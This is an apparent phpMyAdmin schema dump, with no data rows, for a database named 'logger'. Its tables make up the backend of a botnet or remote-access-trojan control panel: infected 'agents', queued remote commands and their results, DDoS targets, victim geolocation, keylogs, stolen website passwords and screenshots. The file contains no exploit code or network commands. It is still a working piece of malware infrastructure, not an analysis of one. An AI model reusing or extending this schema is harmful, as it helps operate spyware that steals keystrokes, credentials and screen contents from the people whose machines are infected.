-- phpMyAdmin SQL Dump
-- version 4.1.14
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Dec 31, 2015 at 05:59 AM
-- Server version: 5.6.17
-- PHP Version: 5.5.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `logger`
--

-- --------------------------------------------------------

--
-- Table structure for table `agents`
--

CREATE TABLE IF NOT EXISTS `agents` (
  `bot_id` varchar(45) NOT NULL,
  `os` varchar(45) DEFAULT NULL,
  `hostname` varchar(45) DEFAULT NULL,
  `ip` varchar(45) DEFAULT NULL,
  `first_active_time` datetime DEFAULT NULL,
  `last_active_time` datetime DEFAULT NULL,
  `CC` varchar(45) NOT NULL,
  `Flag` varchar(45) NOT NULL,
  `status` varchar(10) DEFAULT NULL,
  PRIMARY KEY (`bot_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `clilog`
--

CREATE TABLE IF NOT EXISTS `clilog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` varchar(32) NOT NULL,
  `command` text NOT NULL,
  `time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `result` text NOT NULL,
  `status` varchar(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=7 ;

-- --------------------------------------------------------

--
-- Table structure for table `cmd`
--

CREATE TABLE IF NOT EXISTS `cmd` (
  `bot_id` varchar(32) NOT NULL,
  `command` text NOT NULL,
  `result` text NOT NULL,
  `status` varchar(10) NOT NULL,
  PRIMARY KEY (`bot_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `commands`
--

CREATE TABLE IF NOT EXISTS `commands` (
  `bot_id` varchar(45) NOT NULL,
  `cmd_id` int(11) NOT NULL,
  `cmd` text NOT NULL,
  `active` varchar(10) NOT NULL,
  PRIMARY KEY (`bot_id`,`cmd_id`),
  UNIQUE KEY `key` (`bot_id`,`cmd_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `countries`
--

CREATE TABLE IF NOT EXISTS `countries` (
  `id_countries` int(3) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) DEFAULT NULL,
  `iso_alpha2` varchar(2) DEFAULT NULL,
  `iso_alpha3` varchar(3) DEFAULT NULL,
  `iso_numeric` int(11) DEFAULT NULL,
  `currency_code` char(3) DEFAULT NULL,
  `currency_name` varchar(32) DEFAULT NULL,
  `currrency_symbol` varchar(3) DEFAULT NULL,
  `flag` varchar(6) DEFAULT NULL,
  PRIMARY KEY (`id_countries`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=240 ;

-- --------------------------------------------------------

--
-- Table structure for table `ddos`
--

CREATE TABLE IF NOT EXISTS `ddos` (
  `id` int(11) NOT NULL,
  `bot_id` varchar(45) NOT NULL,
  `ip` varchar(45) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `geos`
--

CREATE TABLE IF NOT EXISTS `geos` (
  `botID` varchar(45) NOT NULL,
  `ip` varchar(45) NOT NULL,
  `time` datetime NOT NULL,
  `asInfo` text NOT NULL,
  `city` varchar(45) NOT NULL,
  `country` varchar(45) NOT NULL,
  `countryCode` varchar(10) NOT NULL,
  `isp` text NOT NULL,
  `lat` float NOT NULL,
  `lon` float NOT NULL,
  `org` text NOT NULL,
  `query` text NOT NULL,
  `region` text NOT NULL,
  `regionName` text NOT NULL,
  `status` text NOT NULL,
  `timezone` text NOT NULL,
  `zip` text NOT NULL,
  PRIMARY KEY (`botID`,`ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `keylogs`
--

CREATE TABLE IF NOT EXISTS `keylogs` (
  `bot_id` varchar(45) NOT NULL,
  `content` text NOT NULL,
  `time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`bot_id`,`time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `password`
--

CREATE TABLE IF NOT EXISTS `password` (
  `bot_id` varchar(32) NOT NULL,
  `url` varchar(100) NOT NULL,
  `user` varchar(32) NOT NULL,
  `pass` varchar(32) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `resultcmd`
--

CREATE TABLE IF NOT EXISTS `resultcmd` (
  `id` int(12) NOT NULL AUTO_INCREMENT,
  `bot_id` varchar(32) NOT NULL,
  `cmd` varchar(100) NOT NULL,
  `result` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

-- --------------------------------------------------------

--
-- Table structure for table `screenshots`
--

CREATE TABLE IF NOT EXISTS `screenshots` (
  `bot_id` varchar(45) NOT NULL,
  `screen_id` varchar(45) NOT NULL,
  `path` text NOT NULL,
  `time_upload` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`bot_id`,`screen_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(100) NOT NULL,
  `fullname` varchar(32) NOT NULL,
  `email` varchar(32) NOT NULL,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
